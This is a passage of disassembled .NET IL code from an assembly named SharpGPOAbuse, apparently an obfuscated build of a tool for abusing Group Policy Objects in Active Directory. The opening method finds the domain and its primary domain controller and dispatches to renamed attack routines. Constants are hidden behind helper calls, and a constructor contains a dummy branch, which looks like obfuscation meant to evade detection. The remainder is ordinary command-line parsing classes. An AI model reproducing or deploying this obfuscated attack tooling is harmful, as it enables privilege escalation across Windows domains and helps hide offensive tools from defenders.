    IL_053c:  ldloc.s    V_23
    IL_053e:  callvirt   instance class [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.DomainController [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.Domain::get_PdcRoleOwner()
    IL_0543:  callvirt   instance string [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.DirectoryServer::get_Name()
    IL_0548:  stloc.3
    IL_0549:  ldloc.2
    IL_054a:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_054f:  brfalse    IL_055c

    IL_0554:  ldloc.s    V_23
    IL_0556:  callvirt   instance string [System.DirectoryServices]System.DirectoryServices.ActiveDirectory.ActiveDirectoryPartition::get_Name()
    IL_055b:  stloc.2
    IL_055c:  ldnull
    IL_055d:  stloc.s    V_24
    IL_055f:  ldsfld     string IOCompletionCallback
    IL_0564:  stloc.s    V_24
    IL_0566:  ldloc.2
    IL_0567:  ldc.i4.1
    IL_0568:  call       int32 '<Module>'(int32)
    IL_056d:  newarr     [mscorlib]System.Char
    IL_0572:  dup
    IL_0573:  ldc.i4.0
    IL_0574:  ldc.i4.s   46
    IL_0576:  stelem.i2
    IL_0577:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_057c:  stloc.s    V_20
    IL_057e:  ldc.i4.0
    IL_057f:  stloc.s    V_21
    IL_0581:  br         IL_05ac

    IL_0586:  ldloc.s    V_20
    IL_0588:  ldloc.s    V_21
    IL_058a:  ldelem     [mscorlib]System.String
    IL_058f:  stloc.s    V_25
    IL_0591:  ldloc.s    V_24
    IL_0593:  ldsfld     string ThreadPool
    IL_0598:  ldloc.s    V_25
    IL_059a:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_059f:  stloc.s    V_24
    IL_05a1:  ldloc.s    V_21
    IL_05a3:  ldc.i4.1
    IL_05a4:  call       int32 '<Module>'(int32)
    IL_05a9:  add
    IL_05aa:  stloc.s    V_21
    IL_05ac:  ldloc.s    V_21
    IL_05ae:  ldloc.s    V_20
    IL_05b0:  ldlen
    IL_05b1:  conv.i4
    IL_05b2:  blt.s      IL_0586

    IL_05b4:  ldloc.2
    IL_05b5:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_05ba:  stloc.2
    IL_05bb:  ldsfld     string ThreadPriority
    IL_05c0:  ldloc.2
    IL_05c1:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05c6:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_05cb:  ldsfld     string ThreadStart
    IL_05d0:  ldloc.3
    IL_05d1:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05d6:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_05db:  ldsfld     string ThreadState
    IL_05e0:  ldloc.s    V_24
    IL_05e2:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_05e7:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_05ec:  ldloc.s    V_10
    IL_05ee:  brfalse    IL_061f

    .try
    {
      IL_05f3:  ldloc.s    V_4
      IL_05f5:  ldloc.2
      IL_05f6:  ldloc.3
      IL_05f7:  ldloc.s    V_5
      IL_05f9:  ldloc.s    V_24
      IL_05fb:  ldloc.1
      IL_05fc:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreOperationPinDeployment(string,
                                                                                                                                string,
                                                                                                                                string,
                                                                                                                                string,
                                                                                                                                string,
                                                                                                                                bool)
      IL_0601:  leave      IL_061f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0606:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_060b:  ldsfld     string ThreadStateException
      IL_0610:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0615:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_061a:  leave      IL_06ab

    }  // end handler
    IL_061f:  ldloc.s    V_12
    IL_0621:  brfalse    IL_063f

    IL_0626:  ldloc.2
    IL_0627:  ldloc.3
    IL_0628:  ldloc.s    V_5
    IL_062a:  ldloc.s    V_24
    IL_062c:  ldloc.s    V_6
    IL_062e:  ldloc.s    V_7
    IL_0630:  ldloc.s    V_8
    IL_0632:  ldloc.s    V_9
    IL_0634:  ldloc.1
    IL_0635:  ldsfld     string ThreadStaticAttribute
    IL_063a:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreTransaction(string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   bool,
                                                                                                                   string)
    IL_063f:  ldloc.s    V_11
    IL_0641:  brfalse    IL_065f

    IL_0646:  ldloc.2
    IL_0647:  ldloc.3
    IL_0648:  ldloc.s    V_5
    IL_064a:  ldloc.s    V_24
    IL_064c:  ldloc.s    V_6
    IL_064e:  ldloc.s    V_7
    IL_0650:  ldloc.s    V_8
    IL_0652:  ldloc.s    V_9
    IL_0654:  ldloc.1
    IL_0655:  ldsfld     string ThreadStartException
    IL_065a:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreTransaction(string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   string,
                                                                                                                   bool,
                                                                                                                   string)
    IL_065f:  ldloc.s    V_15
    IL_0661:  brfalse    IL_067a

    IL_0666:  ldloc.s    V_14
    IL_0668:  ldloc.s    V_13
    IL_066a:  ldloc.2
    IL_066b:  ldloc.3
    IL_066c:  ldloc.s    V_5
    IL_066e:  ldloc.s    V_24
    IL_0670:  ldsfld     string Timeout
    IL_0675:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreOperationScavenge(string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string)
    IL_067a:  ldloc.s    V_16
    IL_067c:  brfalse    IL_0695

    IL_0681:  ldloc.s    V_14
    IL_0683:  ldloc.s    V_13
    IL_0685:  ldloc.2
    IL_0686:  ldloc.3
    IL_0687:  ldloc.s    V_5
    IL_0689:  ldloc.s    V_24
    IL_068b:  ldsfld     string _TimerCallback
    IL_0690:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreOperationScavenge(string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string,
                                                                                                                         string)
    IL_0695:  ldloc.s    V_17
    IL_0697:  brfalse    IL_06ab

    IL_069c:  ldloc.2
    IL_069d:  ldloc.3
    IL_069e:  ldloc.s    V_5
    IL_06a0:  ldloc.s    V_24
    IL_06a2:  ldloc.s    V_18
    IL_06a4:  ldloc.s    V_4
    IL_06a6:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::CaseInsensitiveHashCodeProvider(string,
                                                                                                                                  string,
                                                                                                                                  string,
                                                                                                                                  string,
                                                                                                                                  string[],
                                                                                                                                  string)
    IL_06ab:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IDictionaryEnumerator

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       37 (0x25)
    .maxstack  4
    .locals init ([0] int32 V_0)
    IL_0000:  ldc.i4     0x29fca52f
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  ldc.i4     0x547cd2f6
    IL_000c:  bne.un     IL_0017

    IL_0011:  ldarg.0
    IL_0012:  br         IL_001f

    IL_0017:  nop
    IL_0018:  ldarg.0
    IL_0019:  br         IL_001f

    IL_001e:  nop
    IL_001f:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0024:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::.ctor

} // end of class SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS

.class public abstract auto ansi beforefieldinit CommandLine.BaseOptionAttribute
       extends [mscorlib]System.Attribute
{
  .field private string _shortName
  .field private object _defaultValue
  .field private bool _hasDefaultValue
  .field private string '<LongName>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private bool '<Required>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string '<HelpText>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public hidebysig specialname instance string 
          get_ShortName() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.BaseOptionAttribute::_shortName
    IL_0006:  ret
  } // end of method BaseOptionAttribute::get_ShortName

  .method assembly hidebysig specialname 
          instance void  set_ShortName(string 'value') cil managed
  {
    // Code size       37 (0x25)
    .maxstack  8
    IL_0000:  ldarg.1
    IL_0001:  brfalse    IL_001d

    IL_0006:  ldarg.1
    IL_0007:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_000c:  ldc.i4.1
    IL_000d:  ble        IL_001d

    IL_0012:  ldstr      "shortName"
    IL_0017:  newobj     instance void [mscorlib]System.ArgumentException::.ctor(string)
    IL_001c:  throw

    IL_001d:  ldarg.0
    IL_001e:  ldarg.1
    IL_001f:  stfld      string CommandLine.BaseOptionAttribute::_shortName
    IL_0024:  ret
  } // end of method BaseOptionAttribute::set_ShortName

  .method public hidebysig specialname instance string 
          get_LongName() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.BaseOptionAttribute::'<LongName>k__BackingField'
    IL_0006:  ret
  } // end of method BaseOptionAttribute::get_LongName

  .method assembly hidebysig specialname 
          instance void  set_LongName(string 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string CommandLine.BaseOptionAttribute::'<LongName>k__BackingField'
    IL_0007:  ret
  } // end of method BaseOptionAttribute::set_LongName

  .method public hidebysig newslot specialname virtual 
          instance bool  get_Required() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.BaseOptionAttribute::'<Required>k__BackingField'
    IL_0006:  ret
  } // end of method BaseOptionAttribute::get_Required

  .method public hidebysig newslot specialname virtual 
          instance void  set_Required(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.BaseOptionAttribute::'<Required>k__BackingField'
    IL_0007:  ret
  } // end of method BaseOptionAttribute::set_Required

  .method public hidebysig specialname instance object 
          get_DefaultValue() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      object CommandLine.BaseOptionAttribute::_defaultValue
    IL_0006:  ret
  } // end of method BaseOptionAttribute::get_DefaultValue

  .method public hidebysig specialname instance void 
          set_DefaultValue(object 'value') cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      object CommandLine.BaseOptionAttribute::_defaultValue
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.1
    IL_0009:  stfld      bool CommandLine.BaseOptionAttribute::_hasDefaultValue
    IL_000e:  ret
  } // end of method BaseOptionAttribute::set_DefaultValue

  .method assembly hidebysig specialname 
          instance bool  get_HasShortName() cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.BaseOptionAttribute::_shortName
    IL_0006:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_000b:  ldc.i4.0
    IL_000c:  ceq
    IL_000e:  ret
  } // end of method BaseOptionAttribute::get_HasShortName

  .method assembly hidebysig specialname 
          instance bool  get_HasLongName() cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance string CommandLine.BaseOptionAttribute::get_LongName()
    IL_0006:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_000b:  ldc.i4.0
    IL_000c:  ceq
    IL_000e:  ret
  } // end of method BaseOptionAttribute::get_HasLongName

  .method assembly hidebysig specialname 
          instance bool  get_HasDefaultValue() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.BaseOptionAttribute::_hasDefaultValue
    IL_0006:  ret
  } // end of method BaseOptionAttribute::get_HasDefaultValue

  .method public hidebysig specialname instance string 
          get_HelpText() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.BaseOptionAttribute::'<HelpText>k__BackingField'
    IL_0006:  ret
  } // end of method BaseOptionAttribute::get_HelpText

  .method public hidebysig specialname instance void 
          set_HelpText(string 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string CommandLine.BaseOptionAttribute::'<HelpText>k__BackingField'
    IL_0007:  ret
  } // end of method BaseOptionAttribute::set_HelpText

  .method family hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Attribute::.ctor()
    IL_0006:  ret
  } // end of method BaseOptionAttribute::.ctor

  .property instance string ShortName()
  {
    .get instance string CommandLine.BaseOptionAttribute::get_ShortName()
    .set instance void CommandLine.BaseOptionAttribute::set_ShortName(string)
  } // end of property BaseOptionAttribute::ShortName
  .property instance string LongName()
  {
    .get instance string CommandLine.BaseOptionAttribute::get_LongName()
    .set instance void CommandLine.BaseOptionAttribute::set_LongName(string)
  } // end of property BaseOptionAttribute::LongName
  .property instance bool Required()
  {
    .get instance bool CommandLine.BaseOptionAttribute::get_Required()
    .set instance void CommandLine.BaseOptionAttribute::set_Required(bool)
  } // end of property BaseOptionAttribute::Required
  .property instance object DefaultValue()
  {
    .get instance object CommandLine.BaseOptionAttribute::get_DefaultValue()
    .set instance void CommandLine.BaseOptionAttribute::set_DefaultValue(object)
  } // end of property BaseOptionAttribute::DefaultValue
  .property instance bool HasShortName()
  {
    .get instance bool CommandLine.BaseOptionAttribute::get_HasShortName()
  } // end of property BaseOptionAttribute::HasShortName
  .property instance bool HasLongName()
  {
    .get instance bool CommandLine.BaseOptionAttribute::get_HasLongName()
  } // end of property BaseOptionAttribute::HasLongName
  .property instance bool HasDefaultValue()
  {
    .get instance bool CommandLine.BaseOptionAttribute::get_HasDefaultValue()
  } // end of property BaseOptionAttribute::HasDefaultValue
  .property instance string HelpText()
  {
    .get instance string CommandLine.BaseOptionAttribute::get_HelpText()
    .set instance void CommandLine.BaseOptionAttribute::set_HelpText(string)
  } // end of property BaseOptionAttribute::HelpText
} // end of class CommandLine.BaseOptionAttribute

.class public auto ansi sealed beforefieldinit CommandLine.HelpOptionAttribute
       extends CommandLine.BaseOptionAttribute
{
  .custom instance void [mscorlib]System.AttributeUsageAttribute::.ctor(valuetype [mscorlib]System.AttributeTargets) = ( 01 00 40 00 00 00 02 00 54 02 0D 41 6C 6C 6F 77   // ..@.....T..Allow
                                                                                                                         4D 75 6C 74 69 70 6C 65 00 54 02 09 49 6E 68 65   // Multiple.T..Inhe
                                                                                                                         72 69 74 65 64 01 )                               // rited.
  .field private static literal string DEFAULT_HELP_TEXT = "Display this help screen."
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldnull
    IL_0002:  ldstr      "help"
    IL_0007:  call       instance void CommandLine.HelpOptionAttribute::.ctor(string,
                                                                              string)
    IL_000c:  ldarg.0
    IL_000d:  ldstr      "Display this help screen."
    IL_0012:  call       instance void CommandLine.BaseOptionAttribute::set_HelpText(string)
    IL_0017:  ret
  } // end of method HelpOptionAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName) cil managed
  {
    // Code size       32 (0x20)
    .maxstack  9
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.BaseOptionAttribute::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.BaseOptionAttribute::set_ShortName(string)
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  call       instance void CommandLine.BaseOptionAttribute::set_LongName(string)
    IL_0014:  ldarg.0
    IL_0015:  ldstr      "Display this help screen."
    IL_001a:  call       instance void CommandLine.BaseOptionAttribute::set_HelpText(string)
    IL_001f:  ret
  } // end of method HelpOptionAttribute::.ctor

  .method public hidebysig specialname virtual 
          instance bool  get_Required() cil managed
  {
    // Code size       2 (0x2)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  ret
  } // end of method HelpOptionAttribute::get_Required

  .method public hidebysig specialname virtual 
          instance void  set_Required(bool 'value') cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_0005:  throw
  } // end of method HelpOptionAttribute::set_Required

  .method assembly hidebysig static void 
          InvokeMethod(object target,
                       class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,class CommandLine.HelpOptionAttribute> pair,
                       [out] string& text) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  6
    .locals init ([0] class [mscorlib]System.Reflection.MethodInfo V_0)
    IL_0000:  ldarg.2
    IL_0001:  ldnull
    IL_0002:  stind.ref
    IL_0003:  ldarg.1
    IL_0004:  callvirt   instance !0 class CommandLine.Pair`2<class [mscorlib]System.Reflection.MethodInfo,class CommandLine.HelpOptionAttribute>::get_Left()
    IL_0009:  stloc.0
    IL_000a:  ldloc.0
    IL_000b:  call       bool CommandLine.HelpOptionAttribute::CheckMethodSignature(class [mscorlib]System.Reflection.MethodInfo)
    IL_0010:  brtrue     IL_001b

    IL_0015:  newobj     instance void [mscorlib]System.MemberAccessException::.ctor()
    IL_001a:  throw

    IL_001b:  ldarg.2
    IL_001c:  ldloc.0
    IL_001d:  ldarg.0
    IL_001e:  ldnull
    IL_001f:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                        object[])
    IL_0024:  castclass  [mscorlib]System.String
    IL_0029:  stind.ref
    IL_002a:  ret
  } // end of method HelpOptionAttribute::InvokeMethod

  .method private hidebysig static bool  CheckMethodSignature(class [mscorlib]System.Reflection.MethodInfo 'value') cil managed
  {
    // Code size       35 (0x23)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.MethodInfo::get_ReturnType()
    IL_0006:  ldtoken    [mscorlib]System.String
    IL_000b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0010:  bne.un     IL_0021

    IL_0015:  ldarg.0
    IL_0016:  callvirt   instance class [mscorlib]System.Reflection.ParameterInfo[] [mscorlib]System.Reflection.MethodBase::GetParameters()
    IL_001b:  ldlen
    IL_001c:  conv.i4
    IL_001d:  ldc.i4.0
    IL_001e:  ceq
    IL_0020:  ret

    IL_0021:  ldc.i4.0
    IL_0022:  ret
  } // end of method HelpOptionAttribute::CheckMethodSignature

  .property instance bool Required()
  {
    .get instance bool CommandLine.HelpOptionAttribute::get_Required()
    .set instance void CommandLine.HelpOptionAttribute::set_Required(bool)
  } // end of property HelpOptionAttribute::Required
} // end of class CommandLine.HelpOptionAttribute

.class public auto ansi beforefieldinit CommandLine.OptionAttribute
       extends CommandLine.BaseOptionAttribute
{
  .custom instance void [mscorlib]System.AttributeUsageAttribute::.ctor(valuetype [mscorlib]System.AttributeTargets) = ( 01 00 80 00 00 00 02 00 54 02 0D 41 6C 6C 6F 77   // ........T..Allow
                                                                                                                         4D 75 6C 74 69 70 6C 65 00 54 02 09 49 6E 68 65   // Multiple.T..Inhe
                                                                                                                         72 69 74 65 64 01 )                               // rited.
  .field static assembly literal string DefaultMutuallyExclusiveSet = "Default"
  .field private initonly string _uniqueName
  .field private string _mutuallyExclusiveSet
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName) cil managed
  {
    // Code size       79 (0x4f)
    .maxstack  6
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.BaseOptionAttribute::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_000c:  brtrue     IL_001d

    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      string CommandLine.OptionAttribute::_uniqueName
    IL_0018:  br         IL_002f

    IL_001d:  ldarg.2
    IL_001e:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0023:  brtrue     IL_002f

    IL_0028:  ldarg.0
    IL_0029:  ldarg.2
    IL_002a:  stfld      string CommandLine.OptionAttribute::_uniqueName
    IL_002f:  ldarg.0
    IL_0030:  ldfld      string CommandLine.OptionAttribute::_uniqueName
    IL_0035:  brtrue     IL_0040

    IL_003a:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_003f:  throw

    IL_0040:  ldarg.0
    IL_0041:  ldarg.1
    IL_0042:  call       instance void CommandLine.BaseOptionAttribute::set_ShortName(string)
    IL_0047:  ldarg.0
    IL_0048:  ldarg.2
    IL_0049:  call       instance void CommandLine.BaseOptionAttribute::set_LongName(string)
    IL_004e:  ret
  } // end of method OptionAttribute::.ctor

  .method assembly hidebysig specialname 
          instance string  get_UniqueName() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionAttribute::_uniqueName
    IL_0006:  ret
  } // end of method OptionAttribute::get_UniqueName

  .method public hidebysig specialname instance string 
          get_MutuallyExclusiveSet() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionAttribute::_mutuallyExclusiveSet
    IL_0006:  ret
  } // end of method OptionAttribute::get_MutuallyExclusiveSet

  .method public hidebysig specialname instance void 
          set_MutuallyExclusiveSet(string 'value') cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.1
    IL_0001:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0006:  brfalse    IL_0017

    IL_000b:  ldarg.0
    IL_000c:  ldstr      "Default"
    IL_0011:  stfld      string CommandLine.OptionAttribute::_mutuallyExclusiveSet
    IL_0016:  ret

    IL_0017:  ldarg.0
    IL_0018:  ldarg.1
    IL_0019:  stfld      string CommandLine.OptionAttribute::_mutuallyExclusiveSet
    IL_001e:  ret
  } // end of method OptionAttribute::set_MutuallyExclusiveSet

  .property instance string UniqueName()
  {
    .get instance string CommandLine.OptionAttribute::get_UniqueName()
  } // end of property OptionAttribute::UniqueName
  .property instance string MutuallyExclusiveSet()
  {
    .get instance string CommandLine.OptionAttribute::get_MutuallyExclusiveSet()
    .set instance void CommandLine.OptionAttribute::set_MutuallyExclusiveSet(string)
  } // end of property OptionAttribute::MutuallyExclusiveSet
} // end of class CommandLine.OptionAttribute

.class public auto ansi sealed beforefieldinit CommandLine.OptionArrayAttribute
       extends CommandLine.OptionAttribute
{
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void CommandLine.OptionAttribute::.ctor(string,
                                                                          string)
    IL_0008:  ret
  } // end of method OptionArrayAttribute::.ctor

} // end of class CommandLine.OptionArrayAttribute

.class public auto ansi sealed beforefieldinit CommandLine.OptionListAttribute
       extends CommandLine.OptionAttribute
{
  .field private char '<Separator>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void CommandLine.OptionAttribute::.ctor(string,
                                                                          string)
    IL_0008:  ldarg.0
    IL_0009:  ldc.i4.s   58
    IL_000b:  call       instance void CommandLine.OptionListAttribute::set_Separator(char)
    IL_0010:  ret
  } // end of method OptionListAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName,
                               char separator) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void CommandLine.OptionAttribute::.ctor(string,
                                                                          string)
    IL_0008:  ldarg.0
    IL_0009:  ldarg.3
    IL_000a:  call       instance void CommandLine.OptionListAttribute::set_Separator(char)
    IL_000f:  ret
  } // end of method OptionListAttribute::.ctor

  .method public hidebysig specialname instance char 
          get_Separator() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      char CommandLine.OptionListAttribute::'<Separator>k__BackingField'
    IL_0006:  ret
  } // end of method OptionListAttribute::get_Separator

  .method public hidebysig specialname instance void 
          set_Separator(char 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      char CommandLine.OptionListAttribute::'<Separator>k__BackingField'
    IL_0007:  ret
  } // end of method OptionListAttribute::set_Separator

  .property instance char Separator()
  {
    .get instance char CommandLine.OptionListAttribute::get_Separator()
    .set instance void CommandLine.OptionListAttribute::set_Separator(char)
  } // end of property OptionListAttribute::Separator
} // end of class CommandLine.OptionListAttribute

.class public auto ansi sealed beforefieldinit CommandLine.ValueListAttribute
       extends [mscorlib]System.Attribute
{
  .custom instance void [mscorlib]System.AttributeUsageAttribute::.ctor(valuetype [mscorlib]System.AttributeTargets) = ( 01 00 80 00 00 00 02 00 54 02 0D 41 6C 6C 6F 77   // ........T..Allow
                                                                                                                         4D 75 6C 74 69 70 6C 65 00 54 02 09 49 6E 68 65   // Multiple.T..Inhe
                                                                                                                         72 69 74 65 64 01 )                               // rited.
  .field private initonly class [mscorlib]System.Type _concreteType
  .field private int32 '<MaximumElements>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method private hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Attribute::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.m1
    IL_0008:  call       instance void CommandLine.ValueListAttribute::set_MaximumElements(int32)
    IL_000d:  ret
  } // end of method ValueListAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class [mscorlib]System.Type concreteType) cil managed
  {
    // Code size       63 (0x3f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.ValueListAttribute::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  brtrue     IL_0017

    IL_000c:  ldstr      "concreteType"
    IL_0011:  newobj     instance void [mscorlib]System.ArgumentNullException::.ctor(string)
    IL_0016:  throw

    IL_0017:  ldtoken    class [mscorlib]System.Collections.Generic.IList`1<string>
    IL_001c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0021:  ldarg.1
    IL_0022:  callvirt   instance bool [mscorlib]System.Type::IsAssignableFrom(class [mscorlib]System.Type)
    IL_0027:  brtrue     IL_0037

    IL_002c:  ldstr      "The types are incompatible."
    IL_0031:  newobj     instance void CommandLine.CommandLineParserException::.ctor(string)
    IL_0036:  throw

